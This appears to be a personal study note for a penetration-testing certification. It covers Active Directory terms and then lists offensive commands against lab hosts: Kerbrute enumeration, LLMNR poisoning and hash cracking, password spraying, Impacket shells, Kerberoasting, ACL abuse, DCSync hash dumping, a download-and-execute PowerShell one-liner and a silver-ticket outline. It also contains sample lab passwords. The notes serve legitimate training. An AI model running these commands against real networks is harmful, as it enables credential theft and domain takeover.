---
title: "AD Notes"
date: 2025-12-12
categories: [AD, CPTS]
tags: [AD , Prepartion , notes, pentest, CPTS]
---
# Active Directory (AD) – Comprehensive Guide

## Introduction

Active Directory (AD) is essentially a large database accessible to all users within a domain, regardless of their privilege level. A basic AD user account with no added privileges can be used to enumerate the majority of objects contained within AD, including but not limited to:

| Domain Computers          | Domain Users                |
|---------------------------|-----------------------------|
| Domain Group Information  | Organizational Units (OUs)  |
| Default Domain Policy     | Functional Domain Levels    |
| Password Policy           | Group Policy Objects (GPOs) |
| Domain Trusts             | Access Control Lists (ACLs) |

### Trusts

Consider two top-level domains (TLDs) with a bidirectional trust relationship.  
These domains have subdomains:

- A.domain1.local  
- B.domain2.local  

By default, a user in the first subdomain cannot authenticate to the second subdomain. A separate trust relationship must be established.

---

## Terminology

### Object
An **object** can be defined as **any resource** present within an Active Directory environment, such as OUs, printers, users, domain controllers, etc.

### Attributes
Every object in Active Directory has an associated set of [attributes](https://docs.microsoft.com/en-us/windows/win32/adschema/attributes-all) used to define its characteristics. For example, a computer object contains attributes such as hostname and DNS name. All attributes have an associated LDAP name for queries (e.g., `displayName` for `Full Name`, `givenName` for `First Name`).

### Schema
The Active Directory [schema](https://docs.microsoft.com/en-us/windows/win32/ad/schema) is the blueprint of an enterprise environment. It defines:
- What types of objects can exist in the AD database
- Their associated attributes  
- Definitions corresponding to AD objects

For example:
- Users belong to the class `user`
- Computers belong to the class `computer`

When an object is created from a class, it's called **instantiation**, and the object is an **instance** of that class (e.g., `RDS01` is an instance of the `computer` class).

### Domain
A **domain** is a logical group of objects (computers, users, OUs, groups, etc.). Think of each domain as a different city within a state or country.

### Forest
A **forest** is a collection of Active Directory domains—the topmost container. It contains all AD objects, including domains, users, groups, computers, and GPOs. A forest can contain one or multiple domains.

### Tree
A **tree** is a collection of AD domains that begins at a single root domain. A forest is a collection of AD trees. Domains in a tree share a parent-child trust relationship.

Example:  
Trees: `inlanefreight.local` and `ilfreight.local`  
Child domains: `corp.inlanefreight.local` and `corp.ilfreight.local`

All domains in a tree share a standard **Global Catalog**.

### Container
**Container objects** hold other objects and have a defined place in the directory subtree hierarchy.

### Leaf
**Leaf objects** do not contain other objects and are found at the end of the subtree hierarchy.

### Global Unique Identifier (GUID)
A [GUID](https://docs.microsoft.com/en-us/windows/win32/adschema/a-objectguid) is a unique 128-bit value assigned when a domain user or group is created. It is stored in the `ObjectGUID` attribute.

### Security Principles
[Security principals](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-principals) are anything the OS can authenticate, including:
- Users
- Computer accounts  
- Threads/processes running in the context of a user/computer account

### Security Identifier (SID)
A [security identifier (SID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-principals) uniquely identifies a security principal or security group. Each account, group, or process has its own unique SID, issued by the domain controller.

### Distinguished Name (DN)
A [Distinguished Name (DN)](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names) describes the full path to an object in AD.  
Example: `cn=bjones,ou=IT,ou=Employees,dc=inlanefreight,dc=local`

### Relative Distinguished Name (RDN)
A [Relative Distinguished Name (RDN)](https://docs.microsoft.com/en-us/windows/win32/ad/object-names-and-identities) is a single component of the DN that identifies the object as unique at its current level in the naming hierarchy.  
Example: `bjones` is the RDN in the DN above.

### sAMAccountName
The [sAMAccountName](https://docs.microsoft.com/en-us/windows/win32/ad/naming-properties#samaccountname) is the user's logon name (e.g., `bjones`). It must be unique and ≤20 characters.

### userPrincipalName
The [userPrincipalName](https://social.technet.microsoft.com/wiki/contents/articles/52250.active-directory-user-principal-name.aspx) attribute identifies users in AD in the format `bjones@inlanefreight.local`. It is not mandatory.

### FSMO Roles
[Flexible Single Master Operation (FSMO)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/fsmo-roles) roles prevent conflicts in multi-DC environments:

| Role | Scope | Description |
|------|-------|-------------|
| Schema Master | Forest | Modifies the AD schema |
| Domain Naming Master | Forest | Adds/removes domains |
| RID Master | Domain | Allocates RID pools |
| PDC Emulator | Domain | Time sync, password changes |
| Infrastructure Master | Domain | Updates cross-domain references |

### Global Catalog (GC)
A **Global Catalog** is a domain controller that stores:
- A full copy of all objects in the current domain  
- A partial copy of objects from other domains in the forest

The GC enables authentication and object searches across the entire forest.

### Read-Only Domain Controller (RODC)
An **RODC** has a read-only AD database:
- No AD account passwords cached (except RODC accounts)  
- Read-only DNS server  
- Prevents SYSVOL modifications from replicating

### Replication
**Replication** transfers updated AD objects between domain controllers to ensure synchronization and provide redundancy.

### Service Principal Name (SPN)
An **SPN** uniquely identifies a service instance and is used by Kerberos authentication to associate a service with a logon account.

### Group Policy Object (GPO)
**GPOs** are virtual collections of policy settings applied to user/computer objects at the domain or OU level.

### Access Control List (ACL)
An **ACL** is an ordered collection of Access Control Entries (ACEs) that apply to an object.

### Access Control Entries (ACE)
Each **ACE** identifies a trustee (user, group, session) and lists allowed, denied, or audited access rights.

### Discretionary Access Control List (DACL)
**DACLs** define which security principals are granted/denied access to an object. If no DACL exists, full access is granted to everyone.

### System Access Control Lists (SACL)
**SACLs** enable logging of access attempts to secured objects for auditing.

### Fully Qualified Domain Name (FQDN)
An **FQDN** is the complete name for a computer/host (e.g., `DC01.INLANEFREIGHT.LOCAL`).

### Tombstone
A **tombstone** is a container that holds deleted AD objects for a set period (Tombstone Lifetime), after which they are permanently removed.

### AD Recycle Bin
The **AD Recycle Bin** facilitates recovery of deleted AD objects without restoring from backups. Objects remain recoverable for a configurable period (default: 60 days).

### SYSVOL
The **SYSVOL** folder stores public domain files (policies, scripts) replicated to all DCs via File Replication Services (FRS).

### AdminSDHolder
The **AdminSDHolder** object manages ACLs for members of built-in privileged groups. The SDProp process runs hourly to enforce protections.

### dsHeuristics
The **dsHeuristics** attribute defines forest-wide configuration settings, including excluding groups from the Protected Groups list.

### adminCount
The **adminCount** attribute determines if the SDProp process protects a user (`1` = protected, `0` or unset = not protected).

### Active Directory Users and Computers (ADUC)
**ADUC** is a GUI console for managing users, groups, computers, and contacts in AD.

### ADSI Edit
**ADSI Edit** is a GUI tool for advanced AD object management (setting/deleting attributes, adding/removing objects).

### sIDHistory
The **sIDHistory** attribute holds previously assigned SIDs, often used during migrations. It can be abused if SID Filtering is disabled.

### NTDS.DIT
The **NTDS.DIT** file is the AD database stored at `C:\Windows\NTDS\`. It contains user/group info and password hashes.

### MSBROWSE
**MSBROWSE** is an obsolete Microsoft networking protocol used for browsing services in early Windows LANs.

### Foreign Security Principals (FSP)
**FSPs** represent security principals from trusted external forests, created automatically when foreign objects are added to local groups.

---

## User and Machine Accounts

```powershell
Get-ADUser -Identity htb-student
```

## Groups

### Built-In Groups

| Group Name | Description |
|------------|-------------|
| Account Operators | Can create/modify most accounts (excluding admin groups) |
| Administrators | Full unrestricted access |
| Backup Operators | Can back up/restore all files; considered Domain Admins on DCs |
| DnsAdmins | Access to network DNS information |
| Domain Admins | Full domain administration; local admin on all domain-joined machines |
| Domain Computers | All domain-joined computers (excluding DCs) |
| Domain Controllers | All DCs in the domain |
| Domain Guests | Built-in Guest account |
| Domain Users | All user accounts in the domain |
| Enterprise Admins | Forest-wide configuration access (root domain only) |
| Event Log Readers | Can read event logs on DCs |
| Group Policy Creator Owners | Can create/edit/delete GPOs |
| Hyper-V Administrators | Full Hyper-V access (virtual DC admins = Domain Admins) |
| IIS_IUSRS | Built-in group for IIS |
| Pre–Windows 2000 Compatible Access | Backward compatibility; may allow anonymous enumeration |
| Print Operators | Manage printers; can log on to DCs locally |
| Protected Users | Additional protections against credential theft |
| Read-only Domain Controllers | All RODCs in the domain |
| Remote Desktop Users | RDP access |
| Remote Management Users | WinRM access |
| Schema Admins | Can modify AD schema (root domain only) |
| Server Operators | Can modify services, access SMB shares on DCs |

### PowerShell

```powershell
Get-ADGroup -Identity "Server Operators" -Properties *
```

### User Rights Assignment

| Privilege | Description |
|-----------|-------------|
| SeRemoteInteractiveLogonRight | RDP logon rights |
| SeBackupPrivilege | Create system backups (SAM, NTDS.dit) |
| SeDebugPrivilege | Debug processes (LSASS credential extraction) |
| SeImpersonatePrivilege | Impersonate tokens (privilege escalation) |
| SeLoadDriverPrivilege | Load/unload device drivers |
| SeTakeOwnershipPrivilege | Take ownership of objects |

---

## AD Reconnaissance

### Tools

| Tool | Description |
|------|-------------|
| [PowerView](https://github.com/PowerShellMafia/PowerSploit)/[SharpView](https://github.com/dmchell/SharpView) | Situational awareness in AD |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Visual AD relationship mapping |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) | C# data collector for BloodHound |
| [Bloodhound.py](https://github.com/fox-it/BloodHound.py) | Python-based ingestor (Impacket) |
| [Kerbrute](https://github.com/ropnop/kerbrute) | Kerberos Pre-Auth enumeration/spraying |
| [Impacket](https://github.com/SecureAuthCorp/impacket) | Python tools for network protocols |
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS/mDNS poisoning |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | Cross-platform MITM platform |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) | Enumeration/attack/post-exploitation |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos abuse toolkit |
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) | Find SPNs tied to user accounts |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) | Audit/attack LAPS environments |
| [Mimikatz](https://github.com/ParrotSec/mimikatz) | Credential extraction, pass-the-hash |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) | Remote SAM/LSA secret dumping |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm) | Interactive WinRM shell |
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) | SMB relay attacks |

### External Reconnaissance

#### What to Look For

| Category | Details |
|----------|---------|
| IP Space | ASN, netblocks, cloud presence, DNS records |
| Domain Information | Admins, subdomains, exposed services, defenses |
| Schema Format | Username formats, password policies |
| Data Disclosures | Public files (PDF, DOCX) with internal info |
| Breach Data | Leaked credentials, user info |

#### Where to Look

| Category | Resources |
|----------|-----------|
| ASN/IP Registrars | IANA, ARIN, RIPE, BGP Toolkit |
| Domain/DNS | DomainTools, PTRArchive, ICANN, viewdns.info |
| Social Media | LinkedIn, Twitter, Facebook |
| Company Websites | News, embedded docs, "About Us" pages |
| Cloud/Dev Storage | GitHub, AWS S3, Azure Blob Storage |
| Breach Data | HaveIBeenPwned, Dehashed |

### Initial Enumeration

#### Host Discovery

```bash
fping -asgq 172.16.5.0/23
```

#### User Enumeration

```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

#### Gaining SYSTEM-Level Access

**Methods:**
- Remote Windows exploits (EternalBlue, BlueKeep)
- Abusing service accounts (Juicy Potato)
- Local privilege escalation flaws
- Local admin → PsExec SYSTEM shell

**Capabilities:**
- Domain enumeration (BloodHound, PowerView)
- Kerberoasting/ASREPRoasting
- Net-NTLMv2 hash gathering (Inveigh)
- Token impersonation
- ACL attacks

---

## LLMNR/NBT-NS Poisoning

### Protocols

| Feature | LLMNR | NBT-NS | mDNS |
|---------|-------|--------|------|
| Stands For | Link-Local Multicast Name Resolution | NetBIOS Name Service | Multicast DNS |
| Primary Use | Modern Windows networks | Legacy Windows networks | Apple/Linux/IoT |
| Method | Multicast | Broadcast | Multicast |
| Address/Port | 224.0.0.252:5355 | 137/UDP | 224.0.0.251:5353 |
| Security | **Insecure** (No authentication) | **Insecure** (No authentication) | **Insecure** (No authentication) |

### Tools

| Tool | Description |
|------|-------------|
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS/mDNS poisoning |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | Cross-platform MITM |
| Metasploit | Built-in spoofing modules |

### Attack

```bash
responder -I <interface>
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

---

## Password Spraying

### Tools
- CrackMapExec
- rpcclient
- enum4linux

### Enumerating Password Policy

#### From Linux
**With Credentials:**
```bash
crackmapexec smb 172.16.5.5 -u <user> -p <password> --pass-pol
```

**Without Credentials (SMB NULL Session):**
```bash
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
rpcclient $> getdompwinfo
enum4linux -P 172.16.5.5
```

**LDAP Anonymous Bind:**
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

#### From Windows
```powershell
net accounts
Get-DomainPolicy
```

### User Enumeration Methods
- SMB NULL session
- LDAP anonymous bind
- Kerbrute with wordlists
- Credential-based validation

#### SMB NULL Session
```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

#### LDAP Anonymous Bind
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Password Spraying Attacks

#### From Linux
**rpcclient:**
```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

**Kerbrute:**
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

**CrackMapExec:**
```bash
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

#### From Windows
```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## Enumeration of Security Controls

```powershell
# Microsoft Defender
Get-MpComputerStatus

# AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell Language Mode
$ExecutionContext.SessionState.LanguageMode

# LAPS Delegated Groups
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights

# LAPS-enabled Computers
Get-LAPSComputers
```

---

## Credentialed Enumeration

### From Linux

#### CrackMapExec
```bash
crackmapexec smb 172.16.5.5 -u <user> -p <password> --users
crackmapexec smb 172.16.5.5 -u <user> -p <password> --groups
crackmapexec smb 172.16.5.130 -u <user> -p <password> --loggedon-users
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

#### SMBMAP
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

#### Impacket Shells
```bash
# SYSTEM shell
psexec.py inlanefreight.local/<user>:'<password>'@172.16.5.125

# User shell (stealthier)
wmiexec.py inlanefreight.local/<user>:'<password>'@172.16.5.5
```

#### BloodHound Data Collection
```bash
bloodhound-python -u 'user' -p 'password' -ns 172.16.5.5 -d inlanefreight.local -c all
```

### From Windows

#### PowerShell
```powershell
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
```

#### PowerView (Deprecated)
```powershell
Get-DomainUser -Identity mmorgan | Select-Object -Property name,samaccountname,description,memberof
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

#### SharpView
```powershell
.\SharpView.exe Get-DomainUser -Identity <username>
```

#### Snaffler
```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

#### SharpHound
```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

---

## Living Off the Land

### Basic Commands

| Command | Result |
| ------- | ------ |
| `hostname` | PC name |
| `[System.Environment]::OSVersion.Version` | OS version |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patches/hotfixes |
| `ipconfig /all` | Network config |
| `set` | Environment variables (CMD) |
| `echo %USERDOMAIN%` | Domain name (CMD) |
| `echo %logonserver%` | Domain controller (CMD) |

### PowerShell

| Cmdlet | Description |
| ------ | ----------- |
| `Get-Module` | Loaded modules |
| `Get-ExecutionPolicy -List` | Execution policies |
| `Set-ExecutionPolicy Bypass -Scope Process` | Temporary bypass |
| `Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` | Command history |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL')"` | Download & execute |

### Network Enumeration

| Command | Description |
| ------- | ----------- |
| `arp -a` | ARP table |
| `ipconfig /all` | Adapter settings |
| `route print` | Routing table |
| `netsh advfirewall show allprofiles` | Firewall status |

### WMI

| Command | Description |
| ------- | ----------- |
| `wmic computersystem get Name,Domain,Manufacturer` | Host info |
| `wmic process list /format:list` | All processes |
| `wmic useraccount list /format:list` | All accounts |
| `wmic group list /format:list` | Local groups |

### Net Commands

| Command | Description |
| ------- | ----------- |
| `net accounts /domain` | Password policy |
| `net group "Domain Admins" /domain` | Domain Admins list |
| `net user /domain` | All domain users |
| `net view /domain` | Domain computers |
| `net share` | Current shares |

---

## Kerberoasting

### From Linux
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### From Windows
```powershell
# Manual
setspn.exe -Q */*
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# PowerView
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Rubeus
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Mitigation
- Use strong service account passwords
- Regular credential rotation
- Monitor SPN requests

---

## ACL/ACE Abuse

### Terminology
- **ACL**: List defining access to resources
- **DACL**: Grants/denies access
- **SACL**: Logs access attempts
- **ACE**: Individual access control entries

### Common ACEs
- **ForceChangePassword**: Reset user passwords
- **GenericWrite**: Write to non-protected attributes
- **AddSelf**: Add self to groups
- **GenericAll**: Full control over object

### Enumeration
```powershell
$sid = Convert-NameToSid <username>
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

### Abuse Examples
```powershell
# Password reset
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred

# Add to group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2

# Targeted Kerberoasting
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'}
```

### DCSync Attack
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

---

## Stacking the Deck

### RDP/WinRM/SQL Admin
```powershell
# RDP Users
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

# WinRM
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# PowerShell Remoting
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\forend

# SQL Server
Get-SQLInstanceDomain
Get-SQLQuery -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

### Kerberos Double Hop
```powershell
# Workaround 1: Credential object
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Workaround 2: PSSession configuration
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

---

## TTPs: Silver Tickets

### How It Works
1. **Gather information**: Domain SID, service DNS name
2. **Obtain NTLM hash**: Service account hash (via Mimikatz)
3. **Forge service ticket**: Create fake TGS using service account hash
4. **Use forged ticket**: Authenticate to service without TGT
5. **Escalate privileges**: Execute code as service account

### Requirements
1. Service account NT hash
2. Service SPN
3. Domain SID

### Detection
- Monitor for TGS requests without TGT
- Alert on unusual service account activity
- Regular service account password rotation

---
